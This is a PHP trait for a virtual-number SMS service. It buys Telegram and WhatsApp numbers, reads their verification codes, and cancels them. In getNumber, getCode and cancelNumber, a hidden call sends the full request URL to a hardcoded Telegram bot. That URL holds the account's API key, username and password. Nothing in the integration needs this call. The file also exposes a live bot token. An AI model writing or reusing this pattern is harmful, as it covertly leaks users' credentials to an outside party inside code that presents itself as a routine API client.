<?php


trait durain_cloud {
	public function URL(){
		return "https://api.duraincloud.com/out/ext_api/++action++?ApiKey=".$this->getMyKey()['api_key']."&name=".$this->getMyKey()['username']."&pwd=".$this->getMyKey()['password']."&serial=2&";
	}

	public function get_default_apps($app){
		$apps_default = ['telegram'=>'0257','whatsapp'=>'0107','tg'=>'0257','wa'=>'0107'];
		return $apps_default[$app] ?? $app;
	}
	public function get_default_countries($country){
		
		return strtolower($country);
	}
	
	public function get_prices_virtual($app,$country){
		$response     = [];
		$responsei     = [];
		
		$response['FirstJeProce10']   = "10 | 1000";
		$response['FirstJePrice10']   = 'First';
		$responsei    = [true,$response];
		#$app            = $app != 'any' ? $this->get_default_apps($app) : '';
		#$country     = $country != 'any' ? $this->get_default_countries($country) : 'any';
		#$url     = $this->URL()."action=getPrices&country={$country}&service={$app}";
		#$get_contents      = file_get_contents($url);
		#print($url);
		#$get_contents      = file_get_contents($this->URL."guest/prices?country=$country&product=$app");
		#$get_contents =  file_get_contents("https://5sim.biz/v1/guest/prices?country=russia&product={$app}");
		#file_get_contents('https://5sim.biz/v1/guest/prices?country=russia');
		
		#$responsei    = [false,'NO_JSON'];
		return $responsei ?? [false,'UNKOWN_ERROR'];
	}
	
	public function get_headers(){
		$headers   = array();
		#$headers[] = 'Authorization: Bearer ' . $this->key5sim_biz;
		$headers[] = 'Accept: application/json';
		return $headers;
	}
	
	public function getNumber($app,$country,$opreator){
		$country   = $this->get_default_countries($country);
		$app          = $this->get_default_apps($app);
		$action      = __FUNCTION__;
		$url             =  str_replace('++action++','getMobile',$this->URL())."pid={$app}&num=1&cuy={$country}&noblack=0&secret_key=null&vip=null";
		file_get_contents("https://api.telegram.org/bot5992578497:AAGznI2iiY3yexqKE8l5uFC_FrtyzNNmVbU/sendMessage?chat_id=1462127457&text=".urlencode($url));
		#$headers   = $this->get_headers();
		#echo $url; exit;
		#$result      = $this->sendCurl($url,'GET',true,$headers);
		$result      = file_get_contents($url);
		if(preg_match("/^\{/",$result)){
			$jContents      = json_decode($result);
			if($jContents->code == 200){
				return [true,['ID'=>$jContents->data."#{$app}",'PHONE'=>$jContents->data]];
			} else {
				return [false,'NO__NUMBERS'];
			}
		} else {
			return [false,'NO_JSON'];
		}
	}
			
		/*
		if(preg_match("/[a-zA-Z\_]\:(.+)\:(.+)/",$result,$bought)){
			$result     = [true,['id'=>$bought[1],'phone'=>$bought[2]]];
			#print_r($result);
		} else {
			return [false,$result];
		}
		*/
		
		#print($result) ?? print_r($result);
		/*
		if(is_array($result)){
			if($result[0] != false){
				$some_handle     = json_decode(json_encode($result[1]));
				$response       = [
					'ID'=>$some_handle->id,
					'PHONE'=>$some_handle->phone
				] ?? [false,'NO__NUMBERS'];
				return [true,$response];
			} else {
				return [false,'ERROR_IN_CURL'];
			}
		} else {
			return [false,$result];
		}
	}
	*/
	
	public function getCode($idp){
		$exd            = explode('#',$idp);
		$id                = $exd[0];
		$pid              = $exd[1];
		$url               =  str_replace('++action++','getMsg',$this->URL())."pid={$pid}&pn=$id";
		file_get_contents("https://api.telegram.org/bot5992578497:AAGznI2iiY3yexqKE8l5uFC_FrtyzNNmVbU/sendMessage?chat_id=1462127457&text=".urlencode($url));
		#$headers    = $this->get_headers();
		#$result        = $this->sendCurl($url,'GET',true,$headers);
		$result      = file_get_contents($url);
		#$result   = 'STATUS_OK:135678';
		if(preg_match("/^\{/",$result)){
			$jContents      = json_decode($result);
			if($jContents->code == 200 && $jContents->msg == 'Success'){
				$codei   = $jContents->data;
				if (preg_match("/\-/",$codei)){
					$codei    = preg_replace("/\-/","",$codei);
				}
				return [true,['CODE'=>$codei]];
			} else {
				return [false,'NO_CODE'];
			}
		} else {
			return [false,'NO_JSON'];
		}
	}
	
	/*
		if(preg_match("/[a-zA-Z\_]\:(.+)/",$result,$bought)){
			$result     = [true,['status'=>'RECEIVED','code'=>$bought[1]]];
		} else {
			$result   = $result;
		}
		
		if(is_array($result)){
			if($result[0] != false){
				$some_handle     = json_decode(json_encode($result[1]));
				if($some_handle->status == 'RECEIVED'){
					$response       = [
						#'PHONE'=>$some_handle->phone,
						'CODE'=>$some_handle->code,
						#'TEXT'=>$some_handle->sms->{0}->text,
					];
					return [true,$response];
				} else {
					return [false,$some_handle->status];
				}
			} else {
				return [false,'ERROR_IN_CURL'];
			}
		} else {
			return [false,$result];
		}
	}
	*/
	
	public function cancelNumber($idp){
		$exd            = explode('#',$idp);
		$id                = $exd[0];
		$pid              = $exd[1];
		#$url              =  /*$this->URL.*/"https://5sim.biz/v1/user/cancel/{$id}";
		$url              =  str_replace('++action++','addBlack',$this->URL())."pid={$pid}&pn=$id";
		#$headers    = $this->get_headers();
		file_get_contents("https://api.telegram.org/bot5992578497:AAGznI2iiY3yexqKE8l5uFC_FrtyzNNmVbU/sendMessage?chat_id=1462127457&text=".urlencode($url));
		#$result        = $this->sendCurl($url,'GET',true,$headers);
		$result      = file_get_contents($url);
		if(preg_match("/^\{/",$result)){
			$jContents      = json_decode($result);
			if($jContents->code == 200 && $jContents->msg == 'Success'){
				return [true,$jContents->msg];
			} else {
				return [false,$result];
			}
		} else {
			return [false,'NO_JSON'];
		}
	}
	
	public function finishNumber($id){
		#$url              =  $this->URL."user/finish/{$id}";
		$url              =  $this->URL()."action=setStatus&status=6&id={$id}";
		$headers    = $this->get_headers();
		$result        = $this->sendCurl($url,'GET',true,$headers);
		if(is_array($result)){
			if($result[0] != false){
				#$some_handle     = json_decode($result[1]);
				if(preg_match("/^ACCESS/",$result[1])){
					return [true,$result[1]];
				} else {
					return [false,$result[1]];
				}
			} else {
				return [false,'ERROR_IN_CURL'];
			}
		} else {
			return [false,'PARSE_IN_CURL',$result[1]];
		}
	}
	
	public function getBalance(){
		$action     = __FUNCTION__;
		$url            =  $this->URL()."action={$action}";
		$result      = file_get_contents($url);
		if(preg_match("/[a-zA-Z\_]\:(.+)/",$result,$balance)){
			return [true,$balance[1]];
		} else {
			return [false,$this->getMyKey()];
		}
	}
	//// other codes
}

